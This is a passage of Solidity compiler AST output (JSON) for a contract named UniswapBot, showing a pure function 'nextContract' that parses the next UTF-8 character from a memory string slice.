															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 907,
															"src": "4888:4:9",
															"typeDescriptions": {
																"typeIdentifier": "t_struct$_slice_$616_memory_ptr",
																"typeString": "struct UniswapBot.slice memory"
															}
														},
														"id": 922,
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "_len",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 613,
														"src": "4888:9:9",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "==",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "30",
														"id": 923,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "4901:1:9",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"src": "4888:14:9",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 934,
												"nodeType": "IfStatement",
												"src": "4884:86:9",
												"trueBody": {
													"id": 933,
													"nodeType": "Block",
													"src": "4904:66:9",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"id": 929,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"expression": {
																		"argumentTypes": null,
																		"id": 925,
																		"name": "rune",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 909,
																		"src": "4919:4:9",
																		"typeDescriptions": {
																			"typeIdentifier": "t_struct$_slice_$616_memory_ptr",
																			"typeString": "struct UniswapBot.slice memory"
																		}
																	},
																	"id": 927,
																	"isConstant": false,
																	"isLValue": true,
																	"isPure": false,
																	"lValueRequested": true,
																	"memberName": "_len",
																	"nodeType": "MemberAccess",
																	"referencedDeclaration": 613,
																	"src": "4919:9:9",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"hexValue": "30",
																	"id": 928,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "4931:1:9",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_0_by_1",
																		"typeString": "int_const 0"
																	},
																	"value": "0"
																},
																"src": "4919:13:9",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 930,
															"nodeType": "ExpressionStatement",
															"src": "4919:13:9"
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 931,
																"name": "rune",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 909,
																"src": "4954:4:9",
																"typeDescriptions": {
																	"typeIdentifier": "t_struct$_slice_$616_memory_ptr",
																	"typeString": "struct UniswapBot.slice memory"
																}
															},
															"functionReturnParameters": 913,
															"id": 932,
															"nodeType": "Return",
															"src": "4947:11:9"
														}
													]
												}
											},
											{
												"assignments": [
													936
												],
												"declarations": [
													{
														"constant": false,
														"id": 936,
														"mutability": "mutable",
														"name": "l",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1022,
														"src": "4983:6:9",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 935,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "4983:4:9",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 937,
												"initialValue": null,
												"nodeType": "VariableDeclarationStatement",
												"src": "4983:6:9"
											},
											{
												"assignments": [
													939
												],
												"declarations": [
													{
														"constant": false,
														"id": 939,
														"mutability": "mutable",
														"name": "b",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1022,
														"src": "5000:6:9",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 938,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "5000:4:9",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 940,
												"initialValue": null,
												"nodeType": "VariableDeclarationStatement",
												"src": "5000:6:9"
											},
											{
												"AST": {
													"nodeType": "YulBlock",
													"src": "5089:56:9",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "5091:52:9",
															"value": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"arguments": [
																					{
																						"arguments": [
																							{
																								"arguments": [
																									{
																										"name": "self",
																										"nodeType": "YulIdentifier",
																										"src": "5120:4:9"
																									},
																									{
																										"kind": "number",
																										"nodeType": "YulLiteral",
																										"src": "5126:2:9",
																										"type": "",
																										"value": "32"
																									}
																								],
																								"functionName": {
																									"name": "add",
																									"nodeType": "YulIdentifier",
																									"src": "5116:3:9"
																								},
																								"nodeType": "YulFunctionCall",
																								"src": "5116:13:9"
																							}
																						],
																						"functionName": {
																							"name": "mload",
																							"nodeType": "YulIdentifier",
																							"src": "5110:5:9"
																						},
																						"nodeType": "YulFunctionCall",
																						"src": "5110:20:9"
																					},
																					{
																						"kind": "number",
																						"nodeType": "YulLiteral",
																						"src": "5132:2:9",
																						"type": "",
																						"value": "31"
																					}
																				],
																				"functionName": {
																					"name": "sub",
																					"nodeType": "YulIdentifier",
																					"src": "5106:3:9"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "5106:29:9"
																			}
																		],
																		"functionName": {
																			"name": "mload",
																			"nodeType": "YulIdentifier",
																			"src": "5100:5:9"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "5100:36:9"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "5138:4:9",
																		"type": "",
																		"value": "0xFF"
																	}
																],
																"functionName": {
																	"name": "and",
																	"nodeType": "YulIdentifier",
																	"src": "5096:3:9"
																},
																"nodeType": "YulFunctionCall",
																"src": "5096:47:9"
															},
															"variableNames": [
																{
																	"name": "b",
																	"nodeType": "YulIdentifier",
																	"src": "5091:1:9"
																}
															]
														}
													]
												},
												"evmVersion": "istanbul",
												"externalReferences": [
													{
														"declaration": 939,
														"isOffset": false,
														"isSlot": false,
														"src": "5091:1:9",
														"valueSize": 1
													},
													{
														"declaration": 907,
														"isOffset": false,
														"isSlot": false,
														"src": "5120:4:9",
														"valueSize": 1
													}
												],
												"id": 941,
												"nodeType": "InlineAssembly",
												"src": "5080:65:9"
											},
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 944,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 942,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 939,
														"src": "5159:1:9",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "<",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "30783830",
														"id": 943,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "5163:4:9",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_128_by_1",
															"typeString": "int_const 128"
														},
														"value": "0x80"
													},
													"src": "5159:8:9",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": {
													"condition": {
														"argumentTypes": null,
														"commonType": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"id": 952,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftExpression": {
															"argumentTypes": null,
															"id": 950,
															"name": "b",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 939,
															"src": "5210:1:9",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "BinaryOperation",
														"operator": "<",
														"rightExpression": {
															"argumentTypes": null,
															"hexValue": "30784530",
															"id": 951,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "5214:4:9",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_rational_224_by_1",
																"typeString": "int_const 224"
															},
															"value": "0xE0"
														},
														"src": "5210:8:9",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"falseBody": {
														"condition": {
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 960,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 958,
																"name": "b",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 939,
																"src": "5261:1:9",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "<",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "30784630",
																"id": 959,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "5265:4:9",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_240_by_1",
																	"typeString": "int_const 240"
																},
																"value": "0xF0"
															},
															"src": "5261:8:9",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"falseBody": {
															"id": 970,
															"nodeType": "Block",
															"src": "5309:32:9",
															"statements": [
																{
																	"expression": {
																		"argumentTypes": null,
																		"id": 968,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"leftHandSide": {
																			"argumentTypes": null,
																			"id": 966,
																			"name": "l",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 936,
																			"src": "5324:1:9",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"nodeType": "Assignment",
																		"operator": "=",
																		"rightHandSide": {
																			"argumentTypes": null,
																			"hexValue": "34",
																			"id": 967,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"kind": "number",
																			"lValueRequested": false,
																			"nodeType": "Literal",
																			"src": "5328:1:9",
																			"subdenomination": null,
																			"typeDescriptions": {
																				"typeIdentifier": "t_rational_4_by_1",
																				"typeString": "int_const 4"
																			},
																			"value": "4"
																		},
																		"src": "5324:5:9",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"id": 969,
																	"nodeType": "ExpressionStatement",
																	"src": "5324:5:9"
																}
															]
														},
														"id": 971,
														"nodeType": "IfStatement",
														"src": "5258:83:9",
														"trueBody": {
															"id": 965,
															"nodeType": "Block",
															"src": "5271:32:9",
															"statements": [
																{
																	"expression": {
																		"argumentTypes": null,
																		"id": 963,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"leftHandSide": {
																			"argumentTypes": null,
																			"id": 961,
																			"name": "l",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 936,
																			"src": "5286:1:9",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"nodeType": "Assignment",
																		"operator": "=",
																		"rightHandSide": {
																			"argumentTypes": null,
																			"hexValue": "33",
																			"id": 962,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"kind": "number",
																			"lValueRequested": false,
																			"nodeType": "Literal",
																			"src": "5290:1:9",
																			"subdenomination": null,
																			"typeDescriptions": {
																				"typeIdentifier": "t_rational_3_by_1",
																				"typeString": "int_const 3"
																			},
																			"value": "3"
																		},
																		"src": "5286:5:9",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"id": 964,
																	"nodeType": "ExpressionStatement",
																	"src": "5286:5:9"
																}
															]
														}
													},
													"id": 972,
													"nodeType": "IfStatement",
													"src": "5207:134:9",
													"trueBody": {
														"id": 957,
														"nodeType": "Block",
														"src": "5220:32:9",
														"statements": [
															{
																"expression": {
																	"argumentTypes": null,
																	"id": 955,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftHandSide": {
																		"argumentTypes": null,
																		"id": 953,
																		"name": "l",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 936,
																		"src": "5235:1:9",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"nodeType": "Assignment",
																	"operator": "=",
																	"rightHandSide": {
																		"argumentTypes": null,
																		"hexValue": "32",
																		"id": 954,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "number",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "5239:1:9",
																		"subdenomination": null,
																		"typeDescriptions": {
																			"typeIdentifier": "t_rational_2_by_1",
																			"typeString": "int_const 2"
																		},
																		"value": "2"
																	},
																	"src": "5235:5:9",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"id": 956,
																"nodeType": "ExpressionStatement",
																"src": "5235:5:9"
															}
														]
													}
												},
												"id": 973,
												"nodeType": "IfStatement",
												"src": "5155:186:9",
												"trueBody": {
													"id": 949,
													"nodeType": "Block",
													"src": "5169:32:9",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"id": 947,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 945,
																	"name": "l",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 936,
																	"src": "5184:1:9",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"hexValue": "31",
																	"id": 946,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "5188:1:9",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_1_by_1",
																		"typeString": "int_const 1"
																	},
																	"value": "1"
																},
																"src": "5184:5:9",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 948,
															"nodeType": "ExpressionStatement",
															"src": "5184:5:9"
														}
													]
												}
											},
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 977,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 974,
														"name": "l",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 936,
														"src": "5401:1:9",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": ">",
													"rightExpression": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 975,
															"name": "self",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 907,
															"src": "5405:4:9",
															"typeDescriptions": {
																"typeIdentifier": "t_struct$_slice_$616_memory_ptr",
																"typeString": "struct UniswapBot.slice memory"
															}
														},
														"id": 976,
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "_len",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 613,
														"src": "5405:9:9",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "5401:13:9",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 1001,
												"nodeType": "IfStatement",
												"src": "5397:158:9",
												"trueBody": {
													"id": 1000,
													"nodeType": "Block",
													"src": "5416:139:9",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"id": 983,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"expression": {
																		"argumentTypes": null,
																		"id": 978,
																		"name": "rune",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 909,
																		"src": "5431:4:9",
																		"typeDescriptions": {
																			"typeIdentifier": "t_struct$_slice_$616_memory_ptr",
																			"typeString": "struct UniswapBot.slice memory"
																		}
																	},
																	"id": 980,
																	"isConstant": false,
																	"isLValue": true,
																	"isPure": false,
																	"lValueRequested": true,
																	"memberName": "_len",
																	"nodeType": "MemberAccess",
																	"referencedDeclaration": 613,
																	"src": "5431:9:9",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"expression": {
																		"argumentTypes": null,
																		"id": 981,
																		"name": "self",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 907,
																		"src": "5443:4:9",
																		"typeDescriptions": {
																			"typeIdentifier": "t_struct$_slice_$616_memory_ptr",
																			"typeString": "struct UniswapBot.slice memory"
																		}
																	},
																	"id": 982,
																	"isConstant": false,
																	"isLValue": true,
																	"isPure": false,
																	"lValueRequested": false,
																	"memberName": "_len",
																	"nodeType": "MemberAccess",
																	"referencedDeclaration": 613,
																	"src": "5443:9:9",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"src": "5431:21:9",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 984,
															"nodeType": "ExpressionStatement",
															"src": "5431:21:9"
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 990,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"expression": {
																		"argumentTypes": null,
																		"id": 985,
																		"name": "self",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 907,
																		"src": "5467:4:9",
																		"typeDescriptions": {
																			"typeIdentifier": "t_struct$_slice_$616_memory_ptr",
																			"typeString": "struct UniswapBot.slice memory"
																		}
																	},
																	"id": 987,
																	"isConstant": false,
																	"isLValue": true,
																	"isPure": false,
																	"lValueRequested": true,
																	"memberName": "_ptr",
																	"nodeType": "MemberAccess",
																	"referencedDeclaration": 615,
																	"src": "5467:9:9",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "+=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"expression": {
																		"argumentTypes": null,
																		"id": 988,
																		"name": "self",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 907,
																		"src": "5480:4:9",
																		"typeDescriptions": {
																			"typeIdentifier": "t_struct$_slice_$616_memory_ptr",
																			"typeString": "struct UniswapBot.slice memory"
																		}
																	},
																	"id": 989,
																	"isConstant": false,
																	"isLValue": true,
																	"isPure": false,
																	"lValueRequested": false,
																	"memberName": "_len",
																	"nodeType": "MemberAccess",
																	"referencedDeclaration": 613,
																	"src": "5480:9:9",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"src": "5467:22:9",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 991,
															"nodeType": "ExpressionStatement",
															"src": "5467:22:9"
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 996,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"expression": {
																		"argumentTypes": null,
																		"id": 992,
																		"name": "self",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 907,
																		"src": "5504:4:9",
																		"typeDescriptions": {
																			"typeIdentifier": "t_struct$_slice_$616_memory_ptr",
																			"typeString": "struct UniswapBot.slice memory"
																		}
																	},
																	"id": 994,
																	"isConstant": false,
																	"isLValue": true,
																	"isPure": false,
																	"lValueRequested": true,
																	"memberName": "_len",
																	"nodeType": "MemberAccess",
																	"referencedDeclaration": 613,
																	"src": "5504:9:9",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"hexValue": "30",
																	"id": 995,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "5516:1:9",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_0_by_1",
																		"typeString": "int_const 0"
																	},
																	"value": "0"
																},
																"src": "5504:13:9",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 997,
															"nodeType": "ExpressionStatement",
															"src": "5504:13:9"
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 998,
																"name": "rune",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 909,
																"src": "5539:4:9",
																"typeDescriptions": {
																	"typeIdentifier": "t_struct$_slice_$616_memory_ptr",
																	"typeString": "struct UniswapBot.slice memory"
																}
															},
															"functionReturnParameters": 913,
															"id": 999,
															"nodeType": "Return",
															"src": "5532:11:9"
														}
													]
												}
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 1006,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 1002,
															"name": "self",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 907,
															"src": "5568:4:9",
															"typeDescriptions": {
																"typeIdentifier": "t_struct$_slice_$616_memory_ptr",
																"typeString": "struct UniswapBot.slice memory"
															}
														},
														"id": 1004,
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": true,
														"memberName": "_ptr",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 615,
														"src": "5568:9:9",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "+=",
													"rightHandSide": {
														"argumentTypes": null,
														"id": 1005,
														"name": "l",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 936,
														"src": "5581:1:9",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "5568:14:9",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 1007,
												"nodeType": "ExpressionStatement",
												"src": "5568:14:9"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 1012,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 1008,
															"name": "self",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 907,
															"src": "5593:4:9",
															"typeDescriptions": {
																"typeIdentifier": "t_struct$_slice_$616_memory_ptr",
																"typeString": "struct UniswapBot.slice memory"
															}
														},
														"id": 1010,
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": true,
														"memberName": "_len",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 613,
														"src": "5593:9:9",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "-=",
													"rightHandSide": {
														"argumentTypes": null,
														"id": 1011,
														"name": "l",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 936,
														"src": "5606:1:9",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "5593:14:9",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 1013,
												"nodeType": "ExpressionStatement",
												"src": "5593:14:9"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 1018,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 1014,
															"name": "rune",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 909,
															"src": "5618:4:9",
															"typeDescriptions": {
																"typeIdentifier": "t_struct$_slice_$616_memory_ptr",
																"typeString": "struct UniswapBot.slice memory"
															}
														},
														"id": 1016,
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": true,
														"memberName": "_len",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 613,
														"src": "5618:9:9",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"id": 1017,
														"name": "l",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 936,
														"src": "5630:1:9",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "5618:13:9",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 1019,
												"nodeType": "ExpressionStatement",
												"src": "5618:13:9"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 1020,
													"name": "rune",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 909,
													"src": "5649:4:9",
													"typeDescriptions": {
														"typeIdentifier": "t_struct$_slice_$616_memory_ptr",
														"typeString": "struct UniswapBot.slice memory"
													}
												},
												"functionReturnParameters": 913,
												"id": 1021,
												"nodeType": "Return",
												"src": "5642:11:9"
											}
										]
									},
									"documentation": null,
									"id": 1023,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "nextContract",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 910,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 907,
												"mutability": "mutable",
												"name": "self",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1023,
												"src": "4763:17:9",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_struct$_slice_$616_memory_ptr",
													"typeString": "struct UniswapBot.slice"
												},
												"typeName": {
													"contractScope": null,
													"id": 906,
													"name": "slice",
													"nodeType": "UserDefinedTypeName",
													"referencedDeclaration": 616,
													"src": "4763:5:9",
													"typeDescriptions": {
														"typeIdentifier": "t_struct$_slice_$616_storage_ptr",
														"typeString": "struct UniswapBot.slice"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 909,
												"mutability": "mutable",
												"name": "rune",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1023,
												"src": "4782:17:9",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_struct$_slice_$616_memory_ptr",
													"typeString": "struct UniswapBot.slice"
												},
												"typeName": {
													"contractScope": null,
													"id": 908,
													"name": "slice",
													"nodeType": "UserDefinedTypeName",
													"referencedDeclaration": 616,
													"src": "4782:5:9",
													"typeDescriptions": {
														"typeIdentifier": "t_struct$_slice_$616_storage_ptr",
														"typeString": "struct UniswapBot.slice"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "4762:38:9"
									},
									"returnParameters": {
										"id": 913,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 912,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1023,
												"src": "4824:12:9",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_struct$_slice_$616_memory_ptr",
													"typeString": "struct UniswapBot.slice"
												},
												"typeName": {
													"contractScope": null,
													"id": 911,
													"name": "slice",
													"nodeType": "UserDefinedTypeName",
													"referencedDeclaration": 616,
													"src": "4824:5:9",
													"typeDescriptions": {
														"typeIdentifier": "t_struct$_slice_$616_storage_ptr",
														"typeString": "struct UniswapBot.slice"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "4823:14:9"
									},
									"scope": 2159,
									"src": "4741:920:9",
									"stateMutability": "pure",
									"virtual": false,
